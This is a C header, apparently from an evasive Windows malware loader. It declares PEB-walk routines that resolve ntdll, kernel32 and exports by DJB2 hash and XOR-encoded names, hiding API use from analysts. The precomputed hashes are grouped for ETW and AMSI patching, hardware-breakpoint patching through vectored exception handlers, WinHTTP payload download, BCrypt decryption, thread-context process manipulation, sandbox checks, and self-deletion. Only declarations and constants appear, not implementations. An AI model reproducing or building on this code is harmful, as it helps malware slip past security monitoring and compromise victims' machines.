/*
 * peb.h -- PEB walk for ntdll base resolution and export lookup by hash
 *
 * Eliminates GetModuleHandleA and GetProcAddress calls by walking the
 * PEB -> Ldr -> InMemoryOrderModuleList and parsing export tables by hash.
 */

#ifndef PEB_H
#define PEB_H

#include <windows.h>
#include <winternl.h>   /* UNICODE_STRING / PEB_LDR_DATA / LDR_DATA_TABLE_ENTRY */

/* Resolve the base address of ntdll.dll via a PEB walk (no API calls).
 * Uses load-order position (index 1) with an XOR-encoded name fallback so
 * the plaintext "ntdll.dll" string never appears in the binary. */
HMODULE peb_get_ntdll(void);

/* Resolve ntdll base purely by InMemoryOrderModuleList position (index 1).
 * Returns NULL on failure (caller may fall back). */
HMODULE peb_get_ntdll_by_position(void);

/* Walk PEB->Ldr->InMemoryOrderModuleList and return the base of the module
 * matching `name` (case-insensitive). Returns NULL if not found. */
HMODULE peb_get_module(const wchar_t *name);

/* Resolve kernel32.dll base by position (index 2 in InMemoryOrderModuleList)
 * with an XOR-encoded name fallback. Returns NULL on failure. */
HMODULE peb_get_kernel32(void);

/* Find a function address in a module's export table by DJB2 name hash. */
FARPROC peb_find_export(HMODULE base, DWORD target_hash);

/* Convenience: resolve an ntdll export by name (hashed internally). */
FARPROC peb_resolve(const char *func_name);

/* Convenience: resolve a kernel32 export by precomputed DJB2 hash. */
FARPROC peb_resolve_kernel32(DWORD name_hash);

/* Expose the DJB2 hash function so callers can hash dynamic strings. */
DWORD djb2_hash_pub(const char *str);

/* ---- DJB2 hashes of kernel32 API names (computed offline) ----
 * Algorithm: h = 5381; for each byte c: h = (h<<5)+h+c  (mod 2^32) */
#define HASH_GlobalMemoryStatusEx     0xE4B211F0
#define HASH_GetSystemInfo            0x8308EFF6
#define HASH_GetDiskFreeSpaceExA      0x3DFE2F3C
#define HASH_GetTickCount             0x41AD16B9
#define HASH_QueryPerformanceFrequency 0x40D0207F
#define HASH_QueryPerformanceCounter  0xDB4E150D
#define HASH_Sleep                     0x0E19E5FE
#define HASH_GetEnvironmentVariableA   0x87889701
#define HASH_FindFirstFileA           0xAE2636CF
#define HASH_FindNextFileA            0xF3B43C46
#define HASH_FindClose                 0xB4E7451C
#define HASH_GetSystemTimeAsFileTime   0x4BBF083C
#define HASH_LoadLibraryA              0x5FBFF0FB
#define HASH_GetThreadContext          0xEBA2CFC2
#define HASH_GetCurrentThread          0xE03908C0
#define HASH_CreateProcessA            0xAEB52E19
#define HASH_ResumeThread              0x74162A6E
#define HASH_WaitForSingleObject       0xECCDA1BA
#define HASH_TerminateProcess          0x60AF076D
#define HASH_CloseHandle               0x3870CA07
#define HASH_GetModuleFileNameA        0x13B8A14D
#define HASH_MoveFileExA               0xB96B81BA
#define HASH_ExitProcess               0xB769339E
#define HASH_MultiByteToWideChar       0xE2FDDA8E
#define HASH_WideCharToMultiByte       0xE65D31CE
#define HASH_GetLastError              0x2082EAE3

/* ---- Additional ntdll syscall/function name hashes ---- */
#define HASH_NtCreateUserProcess       0x5F8E4559
#define HASH_NtCreateThreadEx          0xCB0C2130
#define HASH_NtDelayExecution          0x0A49084A
#define HASH_NtWaitForSingleObject     0x4C6DC63C
#define HASH_NtQueryInformationThread  0xC91F149B
#define HASH_NtGetContextThread        0x9E0E1A44
#define HASH_NtSetContextThread        0x308BE0D0
#define HASH_NtCreateFile              0x15A5ECDB
#define HASH_NtWriteFile               0xD69326B2
#define HASH_NtClose                   0x8B8E133D
#define HASH_NtFsControlFile           0xF89DDF61
#define HASH_NtQueryVirtualMemory      0xE39D8E5D
#define HASH_NtSetInformationProcess   0xBB7A48B8
#define HASH_NtTerminateProcess        0x1703AB2F
#define HASH_NtOpenProcess             0x5003C058
#define HASH_NtQuerySystemInformation  0xEE4F73A8
#define HASH_NtQueryObject             0x218116F4

/* ---- ETW event-write family (ntdll) ---- */
#define HASH_EtwEventWrite             0x24A8D022
#define HASH_NtTraceEvent              0x1E2085F8
#define HASH_EtwEventWriteEx           0xF21D69FF
#define HASH_EtwEventWriteTransfer     0x98547547
#define HASH_EtwEventWriteFull         0xEF2073B5

/* ---- WinHTTP function hashes (winhttp.dll) ---- */
#define HASH_WinHttpOpen               0x5E4F39E5
#define HASH_WinHttpConnect             0x7242C17D
#define HASH_WinHttpOpenRequest         0xEAB7B9CE
#define HASH_WinHttpSendRequest         0xB183FAA6
#define HASH_WinHttpReceiveResponse     0x146C4925
#define HASH_WinHttpReadData            0x7195E4E9
#define HASH_WinHttpCloseHandle         0x36220CD5
#define HASH_WinHttpCrackUrl            0x8272988A
#define HASH_WinHttpSetTimeouts         0xA499E0D9

/* ---- CNG (bcrypt.dll) function hashes ---- */
#define HASH_BCryptOpenAlgorithmProvider  0x2A15DFDD
#define HASH_BCryptSetProperty            0xE9049EEA
#define HASH_BCryptGenerateSymmetricKey   0xA81D472A
#define HASH_BCryptDecrypt               0x690BA834
#define HASH_BCryptDestroyKey            0x7B16C8CC
#define HASH_BCryptCloseAlgorithmProvider 0xFCD0CDC1
#define HASH_BCryptCreateHash            0xC30CAB11
#define HASH_BCryptHashData              0x2C1F54B7
#define HASH_BCryptFinishHash            0x6ACFE83E
#define HASH_BCryptDestroyHash           0xDDEE2BC7

/* ---- AMSI (amsi.dll) function hashes ---- */
#define HASH_AmsiScanBuffer             0x29FCD18E
#define HASH_AmsiInitialize             0x8C6AB501
#define HASH_AmsiScanString             0x51990E2B
#define HASH_AmsiScanStream             0x5198FB80
#define HASH_AmsiOpenSession            0x52DD4045
#define HASH_AmsiCloseSession           0xCEE7CFE9
#define HASH_AmsiUninitialize           0x91646C04

/* ---- VEH (ntdll) — Hardware-breakpoint-based patching ---- */
#define HASH_RtlAddVectoredExceptionHandler    0x554BAFA9
#define HASH_RtlRemoveVectoredExceptionHandler 0x880C210E
#define HASH_NtContinue                        0x780A612C

/* ---- Additional kernel32 API hashes ---- */
#define HASH_CreateProcessW            0xAEB52E2F
#define HASH_CreateProcessAsUserW      0xB053CC42
#define HASH_InitializeProcThreadAttributeList 0x5CA2CA33
#define HASH_UpdateProcThreadAttribute  0x09C91A68
#define HASH_DeleteProcThreadAttributeList 0x281072F4
#define HASH_VirtualProtect            0x844FF18D
#define HASH_VirtualAlloc              0x382C0F97
#define HASH_RtlAllocateHeap           0xC0B381DA
#define HASH_RtlFreeHeap               0x70BA71D7
#define HASH_GetProcessHeap            0xC6580D02
#define HASH_RtlZeroMemory             0xFC6E76B0
#define HASH_CreateFileA               0xEB96C5FA
#define HASH_WriteFile                 0x663CECB0
#define HASH_ReadFile                  0x71019921
#define HASH_SetFileAttributesA        0xF5A60659
#define HASH_SetFileInformationByHandle 0xFAA144FE
#define HASH_OpenProcess               0x7136FDD6
#define HASH_GetExitCodeProcess        0xE21026F9
#define HASH_GetCurrentProcessId       0xA3BF64B4
#define HASH_GetModuleHandleW          0x5A153F6E
#define HASH_CreateToolhelp32Snapshot  0x66851295
#define HASH_Process32FirstW           0xE18FC6E8
#define HASH_Process32NextW            0x9307647F

/* ---- Registry (advapi32) hashes ---- */
#define HASH_RegOpenKeyExA             0x074A975C
#define HASH_RegQueryValueExA          0x6B95D114
#define HASH_RegCloseKey               0x736B3702
#define HASH_RegGetValueA              0x79FE96E1

/* ---- F9 key-derivation: volume serial + heap (for nocrt build) ---- */
#define HASH_GetVolumeInformationA     0xC948A224
#define HASH_HeapAlloc                 0x1FFD670E
#define HASH_HeapFree                  0x374893C5
#define HASH_HeapReAlloc               0x1E31C125

/* ntdll FILE_* information class constants (not hashes, just class IDs) ---- */
#define FileDispositionInformationClass  0x0D   /* FileDispositionInformation */
#define FileStandardInformationClass     0x05
#define FileBasicInformationClass        0x04

#endif /* PEB_H */